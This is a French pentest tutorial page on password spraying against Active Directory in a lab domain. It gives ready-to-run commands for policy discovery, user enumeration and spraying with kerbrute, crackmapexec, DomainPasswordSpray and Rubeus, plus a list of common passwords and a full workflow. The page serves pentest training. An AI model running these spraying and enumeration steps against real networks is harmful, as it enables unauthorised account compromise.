# Password Spraying

Le password spraying consiste a tester un petit nombre de mots de passe communs contre un grand nombre de comptes. Contrairement au brute force classique (beaucoup de mots de passe contre un seul compte), cette approche minimise le risque de verrouillage tout en maximisant les chances de trouver un compte avec un mot de passe faible.

## Pourquoi

En environnement AD, le password spraying est souvent le moyen le plus direct d'obtenir un premier acces authentifie. Les utilisateurs choisissent des mots de passe previsibles (saison + annee, nom de l'entreprise + chiffres) meme quand la politique de complexite est active. Un seul compte valide suffit pour debloquer l'enumeration authentifiee et decouvrir les chemins d'attaque via BloodHound.

## Comment ca marche

### Politique de mots de passe

Avant de sprayer, il faut connaitre la politique pour eviter de verrouiller des comptes.

{% tabs %}
{% tab title="Linux" %}
```bash
# - Via CrackMapExec (session NULL ou creds)
crackmapexec smb <IP_DC> --pass-pol

# - Via rpcclient
rpcclient -U "" -N <IP_DC>
rpcclient $> getdompwinfo

# - Via enum4linux-ng
enum4linux-ng -A <IP_DC> -p 445
```
{% endtab %}
{% tab title="Windows" %}
```powershell
# - Via net accounts (depuis un poste joint au domaine)
net accounts /domain

# - Via PowerView
Import-Module .\PowerView.ps1
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```
{% endtab %}
{% endtabs %}

Les elements critiques a noter :

| Parametre | Signification |
|---|---|
| Account Lockout Threshold | Nombre de tentatives avant verrouillage (ex: 5) |
| Account Lockout Duration | Duree du verrouillage (ex: 30 min) |
| Reset Account Lockout Counter | Delai avant remise a zero du compteur |
| Minimum Password Length | Longueur minimale |
| Password Complexity | Necessite 3/4 : majuscule, minuscule, chiffre, special |

{% hint style="danger" %}
Si le seuil de verrouillage est de 5, ne jamais faire plus de 2-3 tentatives par cycle. Attendre au minimum la duree du `Reset Account Lockout Counter` entre chaque cycle. En cas de doute sur la politique, se limiter a une seule tentative et attendre plusieurs heures.
{% endhint %}

### Construire la liste d'utilisateurs

{% tabs %}
{% tab title="Kerbrute" %}
```bash
# - Enumerer les utilisateurs valides via Kerberos
kerbrute userenum -d INLANEFREIGHT.LOCAL \
    --dc <IP_DC> /opt/wordlists/jsmith.txt

# - Combiner avec des noms LinkedIn
# linkedin2username genere des listes au format prenom.nom
python3 linkedin2username.py -c "Inlanefreight"
```
{% endtab %}
{% tab title="SMB / LDAP" %}
```bash
# - Via enum4linux (si session NULL autorisee)
enum4linux -U <IP_DC> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# - Via LDAP anonyme
ldapsearch -x -H ldap://<IP_DC> -b "DC=INLANEFREIGHT,DC=LOCAL" \
    "(objectClass=user)" sAMAccountName | grep sAMAccountName
```
{% endtab %}
{% endtabs %}

### Mots de passe a tester

Mots de passe courants qui respectent la complexite AD (3/4 : maj, min, chiffre, special) :

```
Welcome1
Password1
Spring2024
Winter2024
Company123
P@ssw0rd
<NomEntreprise>2024
<NomEntreprise>@123
```

### Executer le spray

{% tabs %}
{% tab title="Linux - Kerbrute" %}
```bash
# - Spray avec Kerbrute
kerbrute passwordspray -d INLANEFREIGHT.LOCAL \
    --dc <IP_DC> users.txt 'Welcome1'
```
{% endtab %}
{% tab title="Linux - CrackMapExec" %}
```bash
# - Spray via SMB
crackmapexec smb <IP_DC> -u users.txt -p 'Welcome1' --no-bruteforce

# - Spray via LDAP (moins de bruit)
crackmapexec ldap <IP_DC> -u users.txt -p 'Welcome1' --no-bruteforce
```
{% endtab %}
{% tab title="Windows" %}
```powershell
# - DomainPasswordSpray (retire automatiquement les comptes proches du verrouillage)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray_results.txt

# - Rubeus (brute via Kerberos)
.\Rubeus.exe brute /password:Welcome1 /noticket
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
`DomainPasswordSpray` est l'outil le plus sur pour le spray interne depuis Windows : il interroge le domaine pour exclure automatiquement les comptes desactives et ceux proches du seuil de verrouillage. C'est un filet de securite que les outils Linux n'offrent pas nativement.
{% endhint %}

### Apres le spray

```bash
# - Valider les identifiants obtenus
crackmapexec smb <IP_DC> -u '<USER>' -p '<PASSWORD>'

# - Verifier les droits (admin local quelque part ?)
crackmapexec smb 172.16.5.0/23 -u '<USER>' -p '<PASSWORD>'

# - Lancer BloodHound pour cartographier les chemins d'attaque
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL \
    -ns <IP_DC> -c All
```

## En pratique

```bash
# Workflow complet de password spraying

# 1 - Recuperer la politique de mots de passe
crackmapexec smb <IP_DC> --pass-pol

# 2 - Construire la liste d'utilisateurs
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc <IP_DC> jsmith.txt
# Sauvegarder les utilisateurs valides dans valid_users.txt

# 3 - Premiere tentative (1 seul mot de passe)
kerbrute passwordspray -d INLANEFREIGHT.LOCAL \
    --dc <IP_DC> valid_users.txt 'Welcome1'

# 4 - Attendre le delai de reset (ex: 30 min)

# 5 - Deuxieme tentative
kerbrute passwordspray -d INLANEFREIGHT.LOCAL \
    --dc <IP_DC> valid_users.txt 'Spring2024'

# 6 - Si un compte est trouve, valider et enumerer
crackmapexec smb <IP_DC> -u '<USER>' -p '<PASSWORD>'
```

## Pieges et galeres

- **Verrouillage de comptes** : le risque principal. Toujours recuperer la politique avant de sprayer. Si impossible, se limiter a 1 tentative et attendre 4+ heures
- **Comptes deja proches du seuil** : un utilisateur qui a mal tape son mot de passe 3 fois + notre spray = verrouillage. DomainPasswordSpray gere ce cas, pas les outils Linux
- **Pas de resultats** : essayer des variantes saisonnieres (`Autumn2024`, `Fall2024`), le nom de l'entreprise (`Inlane@123`), ou des patterns culturels locaux
- **Mots de passe expires** : Kerberos retourne `KDC_ERR_KEY_EXPIRED` pour les mots de passe expires. Le mot de passe est correct mais inutilisable en l'etat. Noter le compte, il peut etre utile

## Retour terrain

Le password spraying est un incontournable en pentest AD. Sur la majorite des engagements, au moins un compte tombe avec les mots de passe saisonniers (`Saison + Annee`). Le taux de succes augmente significativement quand on combine Kerbrute pour l'enumeration et un spray bien calibre. En interne, DomainPasswordSpray est l'outil le plus sur car il gere automatiquement les comptes a risque. Le spray Kerberos (Kerbrute, Rubeus) est preferable au spray SMB car il genere moins de bruit dans les logs.

## Memo express

| Etape | Outil | Commande |
|---|---|---|
| Politique MDP | CrackMapExec | `crackmapexec smb <DC> --pass-pol` |
| Liste users | Kerbrute | `kerbrute userenum -d DOMAIN --dc <DC> list.txt` |
| Spray Linux | Kerbrute | `kerbrute passwordspray -d DOMAIN --dc <DC> users.txt 'Pass'` |
| Spray Linux | CrackMapExec | `crackmapexec smb <DC> -u users.txt -p 'Pass' --no-bruteforce` |
| Spray Windows | DomainPasswordSpray | `Invoke-DomainPasswordSpray -Password 'Pass'` |
| Validation | CrackMapExec | `crackmapexec smb <DC> -u user -p pass` |

***
